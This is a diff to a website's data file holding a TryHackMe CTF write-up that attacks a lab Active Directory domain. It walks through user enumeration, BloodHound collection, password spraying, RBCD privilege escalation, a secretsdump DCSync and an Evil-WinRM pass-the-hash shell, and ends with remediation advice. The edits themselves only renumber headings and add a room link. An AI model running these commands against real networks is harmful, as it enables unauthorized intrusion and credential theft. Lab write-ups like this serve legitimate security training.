@@ -130,9 +130,10 @@ smb: \\> mget *</code></pre>
     date: "Oct 2026",
     readTime: "8 min",
     platformTag: "TryHackMe",
-    tags: ["ActiveDirectory", "PrivEsc"],
+    tags: ["ActiveDirectory", "AD Pentesting"],
     contentHtml: `
-      <h2>1. Scenario: Assumed Breach</h2>
+    <b>Room Link: </b> <u><a href="https://tryhackme.com/room/forwardchallenge" target="_blank" rel="noopener noreferrer">https://tryhackme.com/room/forwardchallenge</a></u>
+      <h2>Scenario: Assumed Breach</h2>
       <p>The engagement begins under an assumed breach model with low-privilege domain user credentials:</p>
       <pre><code>[ INITIAL ACCESS GRANTED ]
 DOMAIN : ctf.local
@@ -141,7 +142,7 @@ PASS   : JSmith@IT2024</code></pre>
       
       <p>Target Domain Controller: <code>DC01.ctf.local</code> (<code>10.112.186.154</code>)</p>
 
-      <h2>2. Initial Reconnaissance & Network Sweep</h2>
+      <h2>1. Initial Reconnaissance</h2>
       <p>We initiate the assessment with <strong>RustScan</strong> to rapidly discover open ports, piping them directly to Nmap for service detection:</p>
       <pre><code>rustscan -a 10.112.186.154 -b 500 --top -- -sC -sV -Pn -oN Forward</code></pre>
 
@@ -174,7 +175,7 @@ PASS   : JSmith@IT2024</code></pre>
       <pre><code>nxc smb DC01.ctf.local -d ctf.local -u 'j.smith' -p 'JSmith@IT2024' --users-export users</code></pre>
       <img src="/images/writeups/Forward/nxc_smb_enum-users.png" alt="Enumerate Users" class="rounded border border-border my-4 w-full" />
 
-      <h2>3. Active Directory Graph Enumeration (BloodHound)</h2>
+      <h2>2. Bloodhound Enumeration</h2>
       <p>We proceed with domain collection using <code>bloodhound-python</code>:</p>
       <pre><code>bloodhound-python -u 'j.smith' -p 'JSmith@IT2024' -d ctf.local -dc DC01.ctf.local -ns 10.112.186.154 -c All --zip</code></pre>
       <img src="/images/writeups/Forward/bloodhound_enum_zip.png" alt="BloodHound Ingestion Archive" class="rounded border border-border my-4 w-full" />
@@ -183,7 +184,7 @@ PASS   : JSmith@IT2024</code></pre>
       <p>In BloodHound, we discover that <code>j.smith</code> is a member of the built-in <strong>REMOTE DESKTOP USERS</strong> group, permitting graphical remote login to the machine:</p>
       <img src="/images/writeups/Forward/bloodhound_enum_j.smith.png" alt="BloodHound j.smith Node" class="rounded border border-border my-4 w-full" />
 
-      <h2>4. Lateral Movement: RDP Session & KeePass Discovery</h2>
+      <h2>3. Lateral Movement: RDP Session & KeePass Discovery</h2>
       <p>We launch a remote desktop session using <code>xfreerdp</code>:</p>
       <pre><code>xfreerdp /u:j.smith /p:'JSmith@IT2024' /v:DC01.ctf.local /cert:ignore /dynamic-resolution</code></pre>
       <img src="/images/writeups/Forward/xfreerdp_connect1.png" alt="RDP Connection" class="rounded border border-border my-4 w-full" />
@@ -199,14 +200,14 @@ PASS   : JSmith@IT2024</code></pre>
       <pre><code>nxc smb DC01.ctf.local -d ctf.local -u 't.jones' -p '&lt;passwd&gt;' --shares</code></pre>
       <img src="/images/writeups/Forward/t-jones_smb_verfi.png" alt="NetExec t.jones Verification" class="rounded border border-border my-4 w-full" />
 
-      <h2>5. Lateral Movement: Password Spraying</h2>
+      <h2>4. Lateral Movement: Password Spraying</h2>
       <p>With valid credentials for <code>t.jones</code>, we spray the password across the harvested domain user list:</p>
       <pre><code>nxc smb DC01.ctf.local -d ctf.local -u users -p '&lt;passwd&gt;' --continue-on-success</code></pre>
       <img src="/images/writeups/Forward/nxc_passwd_spray.png" alt="Password Spray Results" class="rounded border border-border my-4 w-full" />
 
       <p><strong>Result:</strong> <code>r.williams</code> shares the exact same password as <code>t.jones</code>!</p>
 
-      <h2>6. Escalate Privileges: Resource-Based Constrained Delegation (RBCD)</h2>
+      <h2>5. Escalate Privileges: Resource-Based Constrained Delegation (RBCD)</h2>
       <p>In BloodHound, we inspect the outbound permissions for <strong>r.williams</strong> and find the <strong>AddAllowedToAct</strong> edge over the Domain Controller:</p>
       <img src="/images/writeups/Forward/bloodhound_rwilliams.png" alt="BloodHound r.williams AddAllowedToAct" class="rounded border border-border my-4 max-w-md mx-auto block shadow-sm" />
 
@@ -235,7 +236,7 @@ PASS   : JSmith@IT2024</code></pre>
       <pre><code>impacket-secretsdump -k -no-pass ctf.local/Administrator@DC01.ctf.local</code></pre>
       <img src="/images/writeups/Forward/impacket-secrets.png" alt="SecretsDump DCSync" class="rounded border border-border my-4 w-full" />
 
-      <h2>7. Gaining Shell & Capturing the Flag</h2>
+      <h2>6. Gaining Shell & Capturing the Flag</h2>
       <p>With the Administrator NTLM hash obtained, we authenticate over WinRM using <strong>Evil-WinRM</strong>:</p>
       <pre><code>evil-winrm -u Administrator -H &lt;hash&gt; -i DC01.ctf.local</code></pre>
       <img src="/images/writeups/Forward/evil-winrm.png" alt="Evil-WinRM Administrator Shell" class="rounded border border-border my-4 w-full" />
@@ -243,7 +244,7 @@ PASS   : JSmith@IT2024</code></pre>
       <p>Locate and capture the final flag:</p>
       <pre><code>Get-ChildItem -Path "C:\\Users\\Administrator" -Filter "*.txt" -Recurse</code></pre>
 
-      <h2>8. Key Takeaways & Remediation</h2>
+      <h2>7. Key Takeaways & Remediation</h2>
       <ul>
         <li><strong>Audit ACLs on Computer Objects:</strong> Restrict write permissions on Domain Controllers to Domain Admins only. Helpdesk and standard users should never hold <code>GenericWrite</code> or <code>WriteProperty</code> on tier-0 assets.</li>
         <li><strong>Set MachineAccountQuota to 0:</strong> Prevent unprivileged domain users from joining new computer accounts to the domain.</li>
